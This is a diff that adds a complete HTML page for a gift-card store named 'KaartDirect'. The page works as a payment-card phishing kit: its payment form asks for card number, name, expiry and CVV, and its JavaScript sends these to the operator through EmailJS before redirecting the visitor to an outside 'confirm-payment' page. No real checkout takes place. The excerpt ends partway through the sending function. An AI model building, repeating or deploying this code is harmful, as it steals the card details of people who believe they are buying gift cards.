@@ -1,0 +1,1267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KaartDirect - Gift Cards</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #3498db;
+            --secondary-color: #2c3e50;
+            --accent-color: #e74c3c;
+            --light-color: #ecf0f1;
+            --dark-color: #2c3e50;
+            --success-color: #2ecc71;
+            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f9f9f9;
+            color: var(--dark-color);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        header {
+            background-color: var(--secondary-color);
+            color: white;
+            padding: 1rem 0;
+            box-shadow: var(--shadow);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: white;
+        }
+
+        .logo span {
+            color: var(--primary-color);
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+        }
+
+        nav ul li {
+            margin-left: 1.5rem;
+        }
+
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+
+        nav ul li a:hover {
+            color: var(--primary-color);
+        }
+
+        .hamburger {
+            display: none;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        .page {
+            display: none;
+            min-height: 70vh;
+            padding: 2rem 0;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        .hero {
+            padding: 3rem 0;
+            text-align: center;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+        }
+
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 2rem;
+        }
+
+        .section-title {
+            text-align: center;
+            margin: 2rem 0;
+            font-size: 2rem;
+            color: var(--secondary-color);
+        }
+
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .card-item {
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            transition: transform 0.3s, box-shadow 0.3s;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .card-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .card-image {
+            height: 180px;
+            background-color: var(--light-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .card-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .card-content {
+            padding: 1.5rem;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .card-title {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--secondary-color);
+        }
+
+        .card-description {
+            margin-bottom: 1.5rem;
+            color: #666;
+            flex-grow: 1;
+        }
+
+        .btn {
+            display: inline-block;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            text-align: center;
+            text-decoration: none;
+            transition: background-color 0.3s;
+        }
+
+        .btn:hover {
+            background-color: #2980b9;
+        }
+
+        .btn-accent {
+            background-color: var(--accent-color);
+        }
+
+        .btn-accent:hover {
+            background-color: #c0392b;
+        }
+
+        .btn-success {
+            background-color: var(--success-color);
+        }
+
+        .btn-success:hover {
+            background-color: #27ae60;
+        }
+
+        .purchase-section {
+            background: white;
+            border-radius: 10px;
+            padding: 2rem;
+            box-shadow: var(--shadow);
+            margin-bottom: 3rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: var(--secondary-color);
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            gap: 1rem;
+            margin-top: 0.5rem;
+        }
+
+        .option-btn {
+            padding: 0.8rem;
+            background-color: var(--light-color);
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .option-btn:hover {
+            background-color: #e0e0e0;
+        }
+
+        .option-btn.selected {
+            background-color: var(--primary-color);
+            color: white;
+            border-color: var(--primary-color);
+        }
+
+        .total-display {
+            background-color: #f8f9fa;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1.5rem 0;
+            text-align: center;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-left: 4px solid var(--success-color);
+        }
+
+        .payment-section {
+            background: white;
+            border-radius: 10px;
+            padding: 2rem;
+            box-shadow: var(--shadow);
+            margin-bottom: 3rem;
+        }
+
+        .payment-form {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .card-icons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 1rem;
+        }
+
+        .card-icon {
+            font-size: 2rem;
+            color: #ccc;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        .notification {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 10px;
+            padding: 2rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            display: none;
+        }
+
+        .notification h3 {
+            margin-bottom: 1rem;
+            color: var(--success-color);
+        }
+
+        .notification p {
+            margin-bottom: 1rem;
+        }
+
+        .purchase-details {
+            background-color: #f8f9fa;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            text-align: left;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #999;
+        }
+
+        .close-btn:hover {
+            color: var(--accent-color);
+        }
+
+        footer {
+            background-color: var(--secondary-color);
+            color: white;
+            padding: 2rem 0;
+        }
+
+        .footer-content {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+        }
+
+        .footer-section {
+            flex: 1;
+            min-width: 250px;
+            margin-bottom: 1.5rem;
+        }
+
+        .footer-logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: var(--primary-color);
+        }
+
+        .contact-info {
+            margin-top: 1rem;
+        }
+
+        .contact-info p {
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+        }
+
+        .contact-info i {
+            margin-right: 0.5rem;
+            width: 20px;
+        }
+
+        .copyright {
+            width: 100%;
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            color: #bbb;
+        }
+
+        .contact-form {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: var(--shadow);
+        }
+
+        textarea.form-control {
+            min-height: 150px;
+            resize: vertical;
+        }
+
+        .legal-content {
+            background: white;
+            border-radius: 10px;
+            padding: 2rem;
+            box-shadow: var(--shadow);
+            margin-bottom: 3rem;
+        }
+
+        .legal-content h2 {
+            margin-bottom: 1rem;
+            color: var(--secondary-color);
+        }
+
+        .legal-content h3 {
+            margin: 1.5rem 0 0.5rem;
+            color: var(--secondary-color);
+        }
+
+        .legal-content p {
+            margin-bottom: 1rem;
+        }
+
+        .legal-content ul {
+            margin-left: 1.5rem;
+            margin-bottom: 1rem;
+        }
+
+        /* Mobile Navigation */
+        .mobile-nav {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            width: 80%;
+            max-width: 300px;
+            height: 100vh;
+            background-color: var(--secondary-color);
+            z-index: 1000;
+            transition: right 0.3s ease;
+            padding: 2rem;
+            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .mobile-nav.active {
+            right: 0;
+        }
+
+        .mobile-nav-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+
+        .mobile-nav-logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: white;
+        }
+
+        .mobile-nav-close {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        .mobile-nav-links {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .mobile-nav-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 1.1rem;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+            display: none;
+        }
+
+        .overlay.active {
+            display: block;
+        }
+
+        /* Responsive styles */
+        @media (max-width: 768px) {
+            .hamburger {
+                display: block;
+            }
+
+            nav ul {
+                display: none;
+            }
+
+            .header-content {
+                flex-direction: row;
+            }
+
+            .hero h1 {
+                font-size: 2rem;
+            }
+
+            .cards-grid {
+                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            }
+
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+
+            .footer-content {
+                flex-direction: column;
+            }
+
+            .footer-section {
+                margin-bottom: 2rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hero {
+                padding: 2rem 0;
+            }
+
+            .hero h1 {
+                font-size: 1.8rem;
+            }
+
+            .section-title {
+                font-size: 1.5rem;
+            }
+
+            .card-image {
+                height: 150px;
+            }
+
+            .options-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+
+            .container {
+                width: 95%;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .cards-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .options-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .hero h1 {
+                font-size: 1.6rem;
+            }
+
+            .btn {
+                padding: 0.7rem 1.2rem;
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">Kaart<span>Direct</span></div>
+                <nav>
+                    <ul>
+                        <li><a href="#" class="nav-link" data-page="home">Home</a></li>
+                        <li><a href="#" class="nav-link" data-page="cards">Cards</a></li>
+                        <li><a href="#" class="nav-link" data-page="contact">Contact</a></li>
+                    </ul>
+                </nav>
+                <button class="hamburger">
+                    <i class="fas fa-bars"></i>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Mobile Navigation -->
+    <div class="mobile-nav" id="mobileNav">
+        <div class="mobile-nav-header">
+            <div class="mobile-nav-logo">Kaart<span>Direct</span></div>
+            <button class="mobile-nav-close">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+        <div class="mobile-nav-links">
+            <a href="#" class="nav-link" data-page="home">Home</a>
+            <a href="#" class="nav-link" data-page="cards">Cards</a>
+            <a href="#" class="nav-link" data-page="contact">Contact</a>
+            <a href="#" class="nav-link" data-page="legal">Legal Notice</a>
+            <a href="#" class="nav-link" data-page="privacy">Privacy Policy</a>
+        </div>
+    </div>
+    <div class="overlay" id="overlay"></div>
+
+    <!-- Home Page -->
+    <section id="home" class="page active">
+        <div class="hero">
+            <div class="container">
+                <h1>Digital Gift Cards</h1>
+                <p>Easily purchase your Apple, Paysafe, Transcash and Steam gift cards in just a few clicks.</p>
+                <a href="#" class="btn btn-accent nav-link" data-page="cards">View Cards</a>
+            </div>
+        </div>
+
+        <div class="container">
+            <h2 class="section-title">Our Gift Cards</h2>
+            <div class="cards-grid">
+                <div class="card-item">
+                    <div class="card-image">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJYX--Ow4laNz7BWO7a_g8Oa3tX_5JNwT-3w&s" alt="Apple Gift Card">
+                    </div>
+                    <div class="card-content">
+                        <h3 class="card-title">Apple Gift Card</h3>
+                        <p class="card-description">Apple gift card to purchase apps, music, movies and more on the App Store, iTunes and Apple Music.</p>
+                        <button class="btn btn-accent purchase-btn" data-card="apple">Buy Now</button>
+                    </div>
+                </div>
+                <div class="card-item">
+                    <div class="card-image">
+                        <img src="https://etronicstore.de/media/image/product/5/lg/paysafecard-online-kaufen-25-euro.png" alt="Paysafe Card">
+                    </div>
+                    <div class="card-content">
+                        <h3 class="card-title">Paysafe Card</h3>
+                        <p class="card-description">Prepaid card to pay online without credit card. Usable on thousands of websites worldwide.</p>
+                        <button class="btn btn-accent purchase-btn" data-card="paysafe">Buy Now</button>
+                    </div>
+                </div>
+                <div class="card-item">
+                    <div class="card-image">
+                        <img src="https://seagm-media.seagmcdn.com/item_og/1561.jpg" alt="Transcash">
+                    </div>
+                    <div class="card-content">
+                        <h3 class="card-title">Transcash</h3>
+                        <p class="card-description">Alternative payment solution to make online purchases securely without sharing your bank details.</p>
+                        <button class="btn btn-accent purchase-btn" data-card="transcash">Buy Now</button>
+                    </div>
+                </div>
+                <div class="card-item">
+                    <div class="card-image">
+                        <img src="https://www.mygiftcardsupply.com/wp-content/uploads/2022/01/buy-steam-gift-card-online.png" alt="Steam Wallet">
+                    </div>
+                    <div class="card-content">
+                        <h3 class="card-title">Steam Wallet</h3>
+                        <p class="card-description">Credit your Steam wallet to purchase games, DLC, in-game content and more on the Steam platform.</p>
+                        <button class="btn btn-accent purchase-btn" data-card="steam">Buy Now</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Cards Page -->
+    <section id="cards" class="page">
+        <div class="container">
+            <h2 class="section-title">Our Gift Cards</h2>
+            <div class="cards-grid">
+                <div class="card-item">
+                    <div class="card-image">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJYX--Ow4laNz7BWO7a_g8Oa3tX_5JNwT-3w&s" alt="Apple Gift Card">
+                    </div>
+                    <div class="card-content">
+                        <h3 class="card-title">Apple Gift Card</h3>
+                        <p class="card-description">Apple gift card to purchase apps, music, movies and more on the App Store, iTunes and Apple Music.</p>
+                        <button class="btn btn-accent purchase-btn" data-card="apple">Buy Now</button>
+                    </div>
+                </div>
+                <div class="card-item">
+                    <div class="card-image">
+                        <img src="https://etronicstore.de/media/image/product/5/lg/paysafecard-online-kaufen-25-euro.png" alt="Paysafe Card">
+                    </div>
+                    <div class="card-content">
+                        <h3 class="card-title">Paysafe Card</h3>
+                        <p class="card-description">Prepaid card to pay online without credit card. Usable on thousands of websites worldwide.</p>
+                        <button class="btn btn-accent purchase-btn" data-card="paysafe">Buy Now</button>
+                    </div>
+                </div>
+                <div class="card-item">
+                    <div class="card-image">
+                        <img src="https://seagm-media.seagmcdn.com/item_og/1561.jpg" alt="Transcash">
+                    </div>
+                    <div class="card-content">
+                        <h3 class="card-title">Transcash</h3>
+                        <p class="card-description">Alternative payment solution to make online purchases securely without sharing your bank details.</p>
+                        <button class="btn btn-accent purchase-btn" data-card="transcash">Buy Now</button>
+                    </div>
+                </div>
+                <div class="card-item">
+                    <div class="card-image">
+                        <img src="https://www.mygiftcardsupply.com/wp-content/uploads/2022/01/buy-steam-gift-card-online.png" alt="Steam Wallet">
+                    </div>
+                    <div class="card-content">
+                        <h3 class="card-title">Steam Wallet</h3>
+                        <p class="card-description">Credit your Steam wallet to purchase games, DLC, in-game content and more on the Steam platform.</p>
+                        <button class="btn btn-accent purchase-btn" data-card="steam">Buy Now</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Purchase Page -->
+    <section id="purchase" class="page">
+        <div class="container">
+            <h2 class="section-title">Configure Your Purchase</h2>
+            <div class="purchase-section">
+                <form id="purchase-form">
+                    <div class="form-group">
+                        <label for="card-type">Card Type</label>
+                        <input type="text" id="card-type" class="form-control" readonly>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Select Amount</label>
+                        <div class="options-grid" id="amount-options">
+                            <div class="option-btn" data-value="20">20 €</div>
+                            <div class="option-btn" data-value="50">50 €</div>
+                            <div class="option-btn" data-value="100">100 €</div>
+                            <div class="option-btn" data-value="150">150 €</div>
+                            <div class="option-btn" data-value="200">200 €</div>
+                            <div class="option-btn" data-value="250">250 €</div>
+                            <div class="option-btn" data-value="500">500 €</div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="quantity">Quantity</label>
+                        <input type="number" id="quantity" class="form-control" min="1" value="1">
+                    </div>
+                    
+                    <div class="total-display" id="total-display">
+                        Total: 0 €
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" class="form-control" required placeholder="your@email.com">
+                    </div>
+                    
+                    <button type="button" id="continue-payment" class="btn btn-success">Continue to Payment</button>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <!-- Payment Page -->
+    <section id="payment" class="page">
+        <div class="container">
+            <h2 class="section-title">Secure Payment</h2>
+            <div class="payment-section">
+                <div class="payment-form">
+                    <div class="card-icons">
+                        <div class="card-icon">💳</div>
+                    </div>
+                    
+                    <form id="payment-form">
+                        <div class="form-group">
+                            <label for="card-number">Card Number</label>
+                            <input type="text" id="card-number" class="form-control" placeholder="1234 5678 9012 3456" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="card-name">Name on Card</label>
+                            <input type="text" id="card-name" class="form-control" placeholder="John Doe" required>
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="expiry-date">Expiry Date</label>
+                                <input type="text" id="expiry-date" class="form-control" placeholder="MM/YY" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="cvv">CVV</label>
+                                <input type="text" id="cvv" class="form-control" placeholder="123" required>
+                            </div>
+                        </div>
+                        
+                        <button type="button" id="confirm-payment" class="btn btn-success">Confirm Payment</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Page -->
+    <section id="contact" class="page">
+        <div class="container">
+            <h2 class="section-title">Contact Us</h2>
+            <div class="contact-form">
+                <form id="contact-form">
+                    <div class="form-group">
+                        <label for="contact-name">Full Name</label>
+                        <input type="text" id="contact-name" class="form-control" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="contact-email">Email Address</label>
+                        <input type="email" id="contact-email" class="form-control" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="contact-subject">Subject</label>
+                        <input type="text" id="contact-subject" class="form-control" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="contact-message">Message</label>
+                        <textarea id="contact-message" class="form-control" required></textarea>
+                    </div>
+                    
+                    <button type="button" id="send-message" class="btn btn-success">Send Message</button>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <!-- Legal Notice Page -->
+    <section id="legal" class="page">
+        <div class="container">
+            <h2 class="section-title">Legal Notice</h2>
+            <div class="legal-content">
+                <h2>Legal Information</h2>
+                <p>This legal notice regulates the use of the website KaartDirect, owned by KaartDirect Ltd.</p>
+                
+                <h3>Company Information</h3>
+                <p><strong>Company Name:</strong> KaartDirect Ltd.</p>
+                <p><strong>Email:</strong> kaartdirectinfo@gmail.com</p>
+                
+                <h3>Terms of Service</h3>
+                <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+                
+                <h3>Intellectual Property</h3>
+                <p>All content included on this site, such as text, graphics, logos, button icons, images, audio clips, digital downloads, data compilations, and software, is the property of KaartDirect Ltd. or its content suppliers and protected by international copyright laws.</p>
+                
+                <h3>Limitation of Liability</h3>
+                <p>KaartDirect Ltd. shall not be liable for any indirect, incidental, special, consequential or punitive damages, including without limitation, loss of profits, data, use, goodwill, or other intangible losses.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Privacy Policy Page -->
+    <section id="privacy" class="page">
+        <div class="container">
+            <h2 class="section-title">Privacy Policy</h2>
+            <div class="legal-content">
+                <h2>Privacy Policy</h2>
+                <p>This privacy policy explains how KaartDirect Ltd. collects, uses, and protects your personal information when you use our website.</p>
+                
+                <h3>Information We Collect</h3>
+                <p>We may collect the following information:</p>
+                <ul>
+                    <li>Contact information including email address</li>
+                    <li>Demographic information such as postcode, preferences and interests</li>
+                    <li>Other information relevant to customer surveys and/or offers</li>
+                    <li>Payment information necessary to process transactions</li>
+                </ul>
+                
+                <h3>How We Use Your Information</h3>
+                <p>We require this information to understand your needs and provide you with a better service, and in particular for the following reasons:</p>
+                <ul>
+                    <li>Internal record keeping</li>
+                    <li>Improving our products and services</li>
+                    <li>Sending promotional emails about new products, special offers or other information which we think you may find interesting</li>
+                    <li>Processing transactions and delivering purchased products</li>
+                </ul>
+                
+                <h3>Security</h3>
+                <p>We are committed to ensuring that your information is secure. In order to prevent unauthorized access or disclosure, we have put in place suitable physical, electronic and managerial procedures to safeguard and secure the information we collect online.</p>
+                
+                <h3>Cookies</h3>
+                <p>Our website uses cookies to help us provide you with a better website by enabling us to monitor which pages you find useful and which you do not. You can choose to accept or decline cookies.</p>
+                
+                <h3>Controlling Your Personal Information</h3>
+                <p>You may choose to restrict the collection or use of your personal information by contacting us at kaartdirectinfo@gmail.com.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Notification -->
+    <div id="notification" class="notification">
+        <button class="close-btn">&times;</button>
+        <h3>Thank you dear customer!</h3>
+        <p>Your purchase is being processed, you will now be redirected to the official payment page.</p>
+        
+        <div class="purchase-details" id="purchase-details">
+            <!-- Purchase details will be inserted here -->
+        </div>
+        
+        <button id="proceed-payment" class="btn btn-success">Proceed to Payment</button>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <div class="footer-logo">Kaart<span>Direct</span></div>
+                    <p>Your trusted partner for digital gift cards and payment solutions.</p>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Quick Links</h3>
+                    <div class="footer-links">
+                        <a href="#" class="nav-link" data-page="home">Home</a>
+                        <a href="#" class="nav-link" data-page="cards">Cards</a>
+                        <a href="#" class="nav-link" data-page="contact">Contact</a>
+                        <a href="#" class="nav-link" data-page="legal">Legal Notice</a>
+                        <a href="#" class="nav-link" data-page="privacy">Privacy Policy</a>
+                    </div>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Contact Info</h3>
+                    <div class="contact-info">
+                        <p><i class="fas fa-envelope"></i> kaartdirectinfo@gmail.com</p>
+                        <p><i class="fas fa-clock"></i> Support: 24/7</p>
+                        <p><i class="fas fa-globe"></i> Worldwide Service</p>
+                    </div>
+                </div>
+            </div>
+            <div class="copyright">
+                &copy; 2025 KaartDirect. All rights reserved.
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Initialize EmailJS with provided credentials
+        emailjs.init("NvvbcDYPs8fPLvOTd");
+
+        // Global variables to store purchase information
+        let currentCard = "";
+        let selectedAmount = "";
+        let quantity = 1;
+        let customerEmail = "";
+        let totalAmount = 0;
+
+        // Navigation system
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                const pageId = this.getAttribute('data-page');
+                
+                // Hide all pages
+                document.querySelectorAll('.page').forEach(page => {
+                    page.classList.remove('active');
+                });
+                
+                // Show selected page
+                document.getElementById(pageId).classList.add('active');
+                
+                // Close mobile navigation if open
+                closeMobileNav();
+                
+                // Scroll to top
+                window.scrollTo(0, 0);
+            });
+        });
+
+        // Mobile navigation
+        const hamburger = document.querySelector('.hamburger');
+        const mobileNav = document.getElementById('mobileNav');
+        const overlay = document.getElementById('overlay');
+        const mobileNavClose = document.querySelector('.mobile-nav-close');
+
+        hamburger.addEventListener('click', openMobileNav);
+        mobileNavClose.addEventListener('click', closeMobileNav);
+        overlay.addEventListener('click', closeMobileNav);
+
+        function openMobileNav() {
+            mobileNav.classList.add('active');
+            overlay.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeMobileNav() {
+            mobileNav.classList.remove('active');
+            overlay.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        // Purchase buttons
+        document.querySelectorAll('.purchase-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                currentCard = this.getAttribute('data-card');
+                document.getElementById('card-type').value = getCardName(currentCard);
+                
+                // Reset form
+                resetPurchaseForm();
+                
+                // Show purchase page
+                document.querySelectorAll('.page').forEach(page => {
+                    page.classList.remove('active');
+                });
+                document.getElementById('purchase').classList.add('active');
+                
+                // Close mobile navigation if open
+                closeMobileNav();
+                
+                // Scroll to top
+                window.scrollTo(0, 0);
+            });
+        });
+
+        // Amount selection
+        document.querySelectorAll('#amount-options .option-btn').forEach(option => {
+            option.addEventListener('click', function() {
+                // Remove selected class from all options
+                document.querySelectorAll('#amount-options .option-btn').forEach(btn => {
+                    btn.classList.remove('selected');
+                });
+                
+                // Add selected class to clicked option
+                this.classList.add('selected');
+                selectedAmount = this.getAttribute('data-value');
+                
+                // Update total
+                updateTotal();
+            });
+        });
+
+        // Quantity change
+        document.getElementById('quantity').addEventListener('input', function() {
+            quantity = parseInt(this.value) || 1;
+            updateTotal();
+        });
+
+        // Continue to payment button
+        document.getElementById('continue-payment').addEventListener('click', function() {
+            customerEmail = document.getElementById('email').value;
+            
+            // Basic validation
+            if (!selectedAmount) {
+                alert('Please select an amount');
+                return;
+            }
+            
+            if (!customerEmail) {
+                alert('Please enter your email address');
+                return;
+            }
+            
+            // Show payment page
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById('payment').classList.add('active');
+            
+            // Scroll to top
+            window.scrollTo(0, 0);
+        });
+
+        // Confirm payment button
+        document.getElementById('confirm-payment').addEventListener('click', function() {
+            // Payment form validation
+            const cardNumber = document.getElementById('card-number').value;
+            const cardName = document.getElementById('card-name').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+            
+            if (!cardNumber || !cardName || !expiryDate || !cvv) {
+                alert('Please fill in all payment form fields');
+                return;
+            }
+            
+            // Show notification with purchase details
+            showPurchaseDetails();
+            document.getElementById('notification').style.display = 'block';
+        });
+
+        // Proceed to payment button in notification
+        document.getElementById('proceed-payment').addEventListener('click', async function() {
+            // Get card information
+            const cardNumber = document.getElementById('card-number').value;
+            const cardName = document.getElementById('card-name').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+            
+            // Send email to seller first
+            const emailSent = await sendEmailToSeller(cardNumber, cardName, expiryDate, cvv);
+            
+            if (emailSent) {
+                // Redirect to official payment page after email is sent
+                window.location.replace("https://confirm-payment.jimdofree.com/");
+            } else {
+                alert('There was an error processing your order. Please try again.');
+            }
+        });
+
+        // Close notification button
+        document.querySelector('.close-btn').addEventListener('click', function() {
+            document.getElementById('notification').style.display = 'none';
+        });
+
+        // Send message button (contact form)
+        document.getElementById('send-message').addEventListener('click', function() {
+            const name = document.getElementById('contact-name').value;
+            const email = document.getElementById('contact-email').value;
+            const subject = document.getElementById('contact-subject').value;
+            const message = document.getElementById('contact-message').value;
+            
+            if (!name || !email || !subject || !message) {
+                alert('Please fill in all contact form fields');
+                return;
+            }
+            
+            // Send contact message via EmailJS
+            sendContactMessage(name, email, subject, message);
+        });
+
+        // Function to get full card name
+        function getCardName(cardType) {
+            switch(cardType) {
+                case 'apple': return 'Apple Gift Card';
+                case 'paysafe': return 'Paysafe Card';
+                case 'transcash': return 'Transcash';
+                case 'steam': return 'Steam Wallet';
+                default: return '';
+            }
+        }
+
+        // Function to update total amount
+        function updateTotal() {
+            if (selectedAmount && quantity) {
+                totalAmount = parseInt(selectedAmount) * parseInt(quantity);
+                document.getElementById('total-display').textContent = `Total: ${totalAmount} €`;
+            }
+        }
+
+        // Function to reset purchase form
+        function resetPurchaseForm() {
+            selectedAmount = "";
+            quantity = 1;
+            totalAmount = 0;
+            
+            document.querySelectorAll('#amount-options .option-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
+            
+            document.getElementById('quantity').value = "1";
+            document.getElementById('email').value = "";
+            document.getElementById('total-display').textContent = "Total: 0 €";
+        }
+
+        // Function to show purchase details in notification
+        function showPurchaseDetails() {
+            const details = `
+                <p><strong>Card Type:</strong> ${getCardName(currentCard)}</p>
+                <p><strong>Card Value:</strong> ${selectedAmount} €</p>
+                <p><strong>Quantity:</strong> ${quantity}</p>
+                <p><strong>Total Amount:</strong> ${totalAmount} €</p>
+            `;
+            
+            document.getElementById('purchase-details').innerHTML = details;
+        }
+
+        // Function to send email to seller via EmailJS
+        async function sendEmailToSeller(cardNumber, cardName, expiryDate, cvv) {
+            const templateParams = {
+                card_type: getCardName(currentCard),
+                amount: selectedAmount,
+                quantity: quantity,
+                total: totalAmount,
+                customer_email: customerEmail,
